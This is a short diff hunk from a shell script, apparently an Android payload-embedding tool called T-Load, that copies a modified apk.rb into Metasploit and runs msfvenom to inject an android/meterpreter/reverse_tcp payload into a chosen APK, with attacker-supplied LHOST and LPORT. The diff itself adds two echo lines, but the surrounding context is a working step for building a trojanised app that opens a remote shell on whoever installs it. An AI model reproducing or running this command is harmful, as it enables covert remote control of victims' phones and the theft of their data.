@@ -47,6 +47,8 @@ cp $HOME/T-Load/.files/apk.rb $PREFIX/opt/metasploit-framework/lib/msf/core/payl
 fi
 
 clear
+echo "Embed process will being locally on our device"
+echo ""
 msfvenom -x $upath -p android/meterpreter/reverse_tcp LHOST=$vh LPORT=$vp -o $dpath
 echo ""
 echo ""
